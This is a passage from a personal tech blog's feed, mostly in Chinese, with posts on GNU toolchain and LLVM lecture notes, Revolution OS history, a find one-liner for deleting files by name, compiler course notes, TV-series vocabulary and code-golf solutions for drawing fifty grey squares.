&lt;h4&gt;投影片連結：&lt;a href="http://www.slideshare.net/jserv/how-a-compiler-works-gnu-toolchain"&gt;How A Compiler Works: GNU Toolchain&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;1985 - Richard Stallman - GNU FSF (GNU Free Software Foundation)  &lt;/li&gt;
&lt;li&gt;屠龍書 - Syntax Directed Translator (SDT)  &lt;/li&gt;
&lt;li&gt;Embedded System - Toolchain 太新或太舊都不行  &lt;blockquote&gt;
&lt;p&gt;在嵌入式系統中，Toolchain 的版本匹配度影響到個別軟體元件的正確性，如 kernel, libc, graphics framework 等等，而且通常開發者會從個別套件的原始碼一路編譯並建立 system/firmware image，就會遇到各式編譯錯誤、來自個別工具產生的潛在錯誤，或者需要 workaround 的狀況。於是，開發過程就會限定某個版本的 toolchain  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第一版 gcc 是 RMS 寫的，之後的版本漸漸偏離 RMS 的初衷  &lt;/li&gt;
&lt;li&gt;Dead Code Elimination  &lt;/li&gt;
&lt;li&gt;Code Motion, Loop invariant, Pointer Aliasing  &lt;ul&gt;
&lt;li&gt;Pointer Aliasing 是 Compiler 最佳化瓶頸之一，如果不同的 Pointer 指向同個 address，會造成某些generic 的最佳化出錯  &lt;/li&gt;
&lt;li&gt;C99, Restrict Pointer Aliasing  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Pointer_aliasing"&gt;Pointer aliasing - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;In C99, the restrict keyword was added, which specifies that a pointer argument does not alias any other pointer argument.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Static Single Assignment (SSA)  &lt;/li&gt;
&lt;li&gt;cc1: 真正的 GNU C Compiler  &lt;ul&gt;
&lt;li&gt;Source Code  &lt;/li&gt;
&lt;li&gt;Simplified AST  &lt;/li&gt;
&lt;li&gt;Gimple IR  &lt;/li&gt;
&lt;li&gt;Tree SSA Form  &lt;/li&gt;
&lt;li&gt;RTL IR (LISP Style)  &lt;/li&gt;
&lt;li&gt;Final SAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pipeline Scheduling  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Classic_RISC_pipeline"&gt;http://en.wikipedia.org/wiki/Classic_RISC_pipeline&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Instruction Fetch, Decode, Execute, Memory Access, Write Back  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Hazard_%28computer_architecture%29"&gt;Hazard (computer architecture) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LLVM  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UIUC Vikram Adve, Chris Lattner in 2000  &lt;/li&gt;
&lt;li&gt;高度模組化  &lt;/li&gt;
&lt;li&gt;LLVM bitcode (IR)  &lt;/li&gt;
&lt;li&gt;LLVM 一開始是用 GCC 的 Front-end (GPLv2) 結合自己的 Back-end 成為 llvm-gcc，但 RMS 對 LLVM 這種行為感到非常不滿，並在 gcc43 時將授權改為 GPLv3 來反對 LLVM 這種偷幹 Front-end 的方式，導致後來 Apple 發展自己的 Front-end Clang  &lt;blockquote&gt;
&lt;p&gt;LLVM 的授權是 BSD License，沒有一定要 GPL 形式的強制釋出原始碼條款，但 llvm-gcc 實際上是一種「掏空」GPL 授權的 gcc 的方式，也就是讓 BSD 授權的部份在整個編譯器系統中越來越多，這是 Richard Stallman 不滿之處，他認為 GPL 在這樣的狀況下，不再保證 GPL 的效力。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Clang 採模組化設計 (Clang C API)  &lt;ul&gt;
&lt;li&gt;可 export AST  &lt;/li&gt;
&lt;li&gt;改善錯誤訊息  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LLVM Bitcode 用來當傳遞格式還有很多問題  &lt;ul&gt;
&lt;li&gt;Binary Compatibility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目前效能已經逼近 GCC 但還差一點  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Objective-C  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1988  &lt;/li&gt;
&lt;li&gt;Steve Jobs  &lt;/li&gt;
&lt;li&gt;NeXT  &lt;/li&gt;
&lt;li&gt;GCC 2.7  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 Open Source 圈中，誠信是很重要的，千萬別幹抄襲這種事。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Revolution OS&lt;/h3&gt;
&lt;h4&gt;課程連結：&lt;a href="https://sites.google.com/site/fossapc/list-of-lectures/revolutionosyingpianbeijingzhishibuchong"&gt;20150302 - 《Revolution OS》影片背景知識補充 - 自由開源軟體與專案協作&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://fossapc.hackpad.com/-Revolution-OS--RrJpYEByzmr"&gt;從 Revolution OS 看作業系統生態變化 - fossapc.hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Revolution_OS"&gt;Revolution OS - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=jw8K460vx1c"&gt;Revolution OS - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;影片裡同時出現了 RMS 和 Linus，可能以後都不會再看到他們同時出現在同個地方了。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RMS 是非常純的自由教義派，可以為了 Open Source BIOS 去用&lt;a href="http://zh.wikipedia.org/zh-tw/%E9%BE%99%E8%8A%AF"&gt;龍芯&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Linus 則是實用主義派，可以為了實用而向沒有 Open Source 妥協，這是 RMS 完全沒辦法接受的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GNU 早期最知名的軟體就是 Emacs  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;MicroSoft NBC 在 Linux 被大量採用的年代很多頭條都是跟 Linux 有關的，形成一股趣味的對比。ex: VA Linux  &lt;ul&gt;
&lt;li&gt;當年 UNIX 紅到幾乎只要沾上邊就能賺錢，連賣大同電鍋的大同公司當年都搞了一套叫做 MITUX 的 UNIX 系統。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/node/5632"&gt;SCO、IBM與Intel將合作開發IA-64架構的UNIX作業系統 | iThome&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bob.gddfpaper.com/COMPUTER/OS/UNIX/A18.htm"&gt;MITUX - MITUX系統漫談 # csj@pc2.hinet.net&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;microkernel 的 CMU Mach 影響了 MacOS X 10.0 (Darwin) 和 Windows NT，雖然因為 microkernel 效能太差而沒有採用，但還是取其 flexible 的優點併入 monolithic kernel 形成了結合兩者優點的 hybrid kernel  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Mach_(kernel)"&gt;Mach (kernel) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Microkernel"&gt;Microkernel - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Hybrid_kernel"&gt;Hybrid kernel - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Monolithic_kernel"&gt;Monolithic kernel - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Darwin_%28operating_system%29#Kernel"&gt;Darwin (operating system) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Darwin is built around XNU, a hybrid kernel that combines the Mach 3 microkernel, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;關於 microkernel 的發展及介紹可以參考 jserv 的 slides &lt;a href="http://www.slideshare.net/jserv/microkernel-evolution"&gt;Microkernel Evolution&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Misc.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://programmers.stackexchange.com/questions/226573/why-is-the-unix-linker-called-ld"&gt;history - Why is the Unix linker called "ld" - Programmers Stack Exchange&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Linkers in Linux were originally called loaders.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Linking the Object code File&lt;br /&gt;
...Linux comes with its own linker, called ld. (The name is actually short for "load", and "loader" was what linkers were originally called, in the First Age of Unix, back in the 1970s.)  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Course"></category><category term="FOSS"></category><category term="Open Source"></category><category term="Free Software"></category></entry><entry><title>Recursively Delete Files with Specific Name in the Current Directory</title><link href="https://blog.m157q.tw/posts/2015/02/26/recursively-delete-files-with-specific-name-in-the-current-directory/" rel="alternate"></link><published>2015-10-28T14:11:00+08:00</published><updated>2015-10-28T14:11:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-26:posts/2015/02/26/recursively-delete-files-with-specific-name-in-the-current-directory/</id><summary type="html">&lt;h2&gt;Usage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Delete all the files which have same name with &lt;code&gt;${filename}&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find . -name &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;filename&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type f -delete  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Delete all files with .bak file extension in the current dir  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find . -name &lt;span class="s2"&gt;&amp;quot;*.bak&amp;quot;&lt;/span&gt; -type f -delete  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Doc&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-name pattern  
    True if the last component of the pathname being examined matches pattern.  
    Special shell pattern matching characters (``[&amp;#39;&amp;#39;, ``]&amp;#39;&amp;#39;, ``*&amp;#39;&amp;#39;, and ``?&amp;#39;&amp;#39;) may be used as part of pattern.  
    These characters may be matched explicitly by escaping them with a backslash (``\&amp;#39;&amp;#39;).  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or you can use regular expression for file matching.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-regex pattern  
    True if the whole path of the file matches pattern using regular expression.  
    To match a file named ``./foo/xyzzy&amp;#39;&amp;#39;, you can use the regular expression ``.*/[xyz]*&amp;#39;&amp;#39; or ``.*/foo/.*&amp;#39;&amp;#39;,  
    but not ``xyzzy&amp;#39;&amp;#39; or ``/foo/&amp;#39;&amp;#39;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://askubuntu.com/questions/377438/how-can-i-recursively-delete-all-files-of-a-specific-extension-in-the-current-di"&gt;command line - How can I recursively delete all files of a specific extension in the current directory? - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="one-liner"></category></entry><entry><title>Compiler Design Week 1</title><link href="https://blog.m157q.tw/posts/2015/02/24/compiler-design-week-1/" rel="alternate"></link><published>2015-02-26T16:40:00+08:00</published><updated>2015-02-26T16:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-24:posts/2015/02/24/compiler-design-week-1/</id><summary type="html">&lt;h3&gt;2015/02/24&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Andes Assembly&lt;/li&gt;
&lt;li&gt;Fabless IC Design House in Taiwn&lt;ul&gt;
&lt;li&gt;MediaTek - 聯發科&lt;/li&gt;
&lt;li&gt;Novatek - 聯詠&lt;/li&gt;
&lt;li&gt;Realtek - 瑞昱&lt;/li&gt;
&lt;li&gt;HiMax - 奇景&lt;/li&gt;
&lt;li&gt;立錡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Sourcery&lt;/li&gt;
&lt;li&gt;Gate Keeper, Code Reviewer&lt;/li&gt;
&lt;li&gt;DSP Compilers&lt;ul&gt;
&lt;li&gt;Embedded Computing&lt;/li&gt;
&lt;li&gt;Base Band (3G / 4G / LTE / 5G)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Andes (晶心)&lt;ul&gt;
&lt;li&gt;Chung-Ju Wu&lt;/li&gt;
&lt;li&gt;IOT&lt;ul&gt;
&lt;li&gt;ARM 較耗電&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Language in Android&lt;ul&gt;
&lt;li&gt;Java&lt;/li&gt;
&lt;li&gt;V8&lt;/li&gt;
&lt;li&gt;pixelflinger&lt;/li&gt;
&lt;li&gt;RenderScript&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HSA&lt;ul&gt;
&lt;li&gt;GPU, GPGPU&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Augmented Reality Functionality&lt;/li&gt;
&lt;li&gt;Compiler 現在也會參與到省電機制的部分&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;2015/02/26&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Compiler 就是把 source language 轉換成 target language 的一個程式。     &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Cadence_Design_Systems,_Inc._v._Avanti_Corp"&gt;Avanti vs Cadence&lt;/a&gt;   &lt;/li&gt;
&lt;li&gt;Variable-length encoding / decoding     &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikibooks.org/wiki/C_Programming/Variables#Data_type_modifiers"&gt;C Programming/Variables - Wikibooks, open books for an open world&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;Some examples about IR&lt;ul&gt;
&lt;li&gt;LLVM IR = bitcode   &lt;/li&gt;
&lt;li&gt;Java =&amp;gt; bytecode&lt;/li&gt;
&lt;li&gt;C#, VB, VC++, =&amp;gt; MSIL (MiscroSoft Intermediate Language) =&amp;gt; .Net&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Course"></category><category term="Compiler"></category></entry><entry><title>Vocabulary of Halt and Catch Fire S01E06</title><link href="https://blog.m157q.tw/posts/2015/02/19/vocabulary-of-halt-and-catch-fire-s01e06/" rel="alternate"></link><published>2015-10-27T12:50:00+08:00</published><updated>2015-10-27T12:50:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-19:posts/2015/02/19/vocabulary-of-halt-and-catch-fire-s01e06/</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;Cause you are the future. Ain't nothing scarier than that.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這集裡頭最喜歡的應該就是 John 對 Cameron 說的這句了&lt;br /&gt;
人類總是害怕或無法接受太過前衛或新穎的觀念  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是生字  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;oblige  
KK[əˋblaɪdʒ] DJ[əˋblaidʒ]  
vt.及物動詞  
  1. 使不得不，迫使[H][O2]  
    I was obliged to abandon that idea.  
    我不得不放棄那個想法。  
  2. 施恩於；答應……的請求  
    Please oblige me by turning down the radio.  
    勞您駕，請替我把收音機音量調低一些。  
  3. 使感激[H]  
    We&amp;#39;re much obliged to you for your information.  
    我們很感謝你提供的消息。  
  4. 使成為必要  
vi.不及物動詞  
  1. 施恩惠，幫忙  
    Will you oblige with another song?  
    請再唱支歌，好嗎？  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fixate  
KK[ˋfɪkset] DJ[ˋfikseit]  
vi. amp; vt.  
  1. 【心】早期停止性的成熟  
  2. 注視  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;visionary  
KK[ˋvɪʒə͵nɛrɪ] DJ[ˋviʒənəri]  
a.形容詞  
  1. 夢幻的；幻覺的  
  2. 想像中的；不切實際的  
    a visionary scheme  
    不切實際的計畫  
  3. 耽於幻想的，好夢想的  
  4. 有遠見的；富於想像力的  
    a visionary invention  
    富於想像力的發明  
n.[C]可數名詞  
  1. 有幻覺的人  
  2. 好幻想的人；空想家  
    They are left-wing visionaries.  
    他們是左翼空想家。  
  3. 有遠見卓識者  
    True visionaries are often misunderstood by their own generation.  
    真正有遠見卓識者往往受同時代人的誤解。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wallop  
KK[ˋwɑləp] DJ[ˋwɔləp]  
vt.及物動詞  
  1. 【口】痛打；擊潰  
vi.【口】  
  1. 衝過去  
  2. 打滾；顛簸  
  3. 沸騰  
n.【口】  
  1. 重擊；衝擊力  
  2. 奔馳  
  3. 快感  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cabbage  
KK[ˋkæbɪdʒ] DJ[ˋkæbidʒ]  
n.名詞  
  1. 甘藍菜，卷心菜[C][U]  
  2. 【美】【俚】紙幣，錢  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Cabbage_Patch_Kids"&gt;Cabbage Patch Kids - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dustup  
KK[ˋdʌst͵ʌp] DJ[ˋdʌstʌp]  
n.名詞  
  1. 【口】騷動；爭論；爭吵  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bullpen  
KK[ˋbʊl͵pɛn] DJ[ˋbul͵pen]  
n.名詞  
  1. 牛欄  
  2. 臨時拘留所；臨時住宿處  
  3. 【棒】救援投手練球的區域  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;theatrics  
KK[θiˋætrɪks] DJ[θiˋætriks]  
n.名詞  
  1. （用作單）戲劇演出；舞臺表演藝術  
  2. 戲劇效果  
  3. 矯飾；誇張  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="Halt and Catch Fire"></category><category term="TV Series"></category><category term="Geek"></category><category term="English"></category></entry><entry><title>Fifty Shades of Grey - Programmer Version</title><link href="https://blog.m157q.tw/posts/2015/02/18/fifty-shades-of-grey-programmer-version/" rel="alternate"></link><published>2015-02-18T22:36:42+08:00</published><updated>2015-02-18T22:36:42+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/fifty-shades-of-grey-programmer-version/</id><summary type="html">&lt;h1&gt;Reference&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://codegolf.stackexchange.com/questions/45736/fifty-shades-of-grey"&gt;code golf - Fifty Shades of Grey - Programming Puzzles &amp;amp; Code Golf Stack Exchange&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;Boys and girls are excited to see Fifty Shades of Grey on the silver screen, we just want to code without being bothered, so here's a challenge to pick our brain.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然後要求如下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Print on the screen fifty squares filled each with a different shade of grey  &lt;/li&gt;
&lt;li&gt;If your language of choice lacks image processing capabilities, you could output an image file  &lt;/li&gt;
&lt;li&gt;Squares must be visible, at least 20 x 20 pixels  &lt;/li&gt;
&lt;li&gt;You can not use random numbers unless you make sure each shade is unique.  &lt;/li&gt;
&lt;li&gt;You can not connect to any service over any network  &lt;/li&gt;
&lt;li&gt;You can not read any files in your program.  &lt;/li&gt;
&lt;li&gt;You can not use any libraries out of the standard libraries of your language of choice.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目前最多人按讚的是 Mathematica 寫的版本，只花 30 chars  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ArrayPlot&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;#2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ArrayPlot&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nv"&gt;#2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其他還有：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CJam - 23 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;P2&amp;quot;1e3K51_,1&amp;gt;K*$K*~]S*  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Mathematica - 34 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;GrayLevel&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Style&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Sage - 29 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plot&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Java - 180 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.awt.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Frame&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;paint&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Graphics&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setColor&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Color&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;328965&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;)),&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fillRect&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++/&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="n"&gt;setSize&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;600&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;600&lt;/span&gt;&lt;span class="o"&gt;);}}.&lt;/span&gt;&lt;span class="na"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
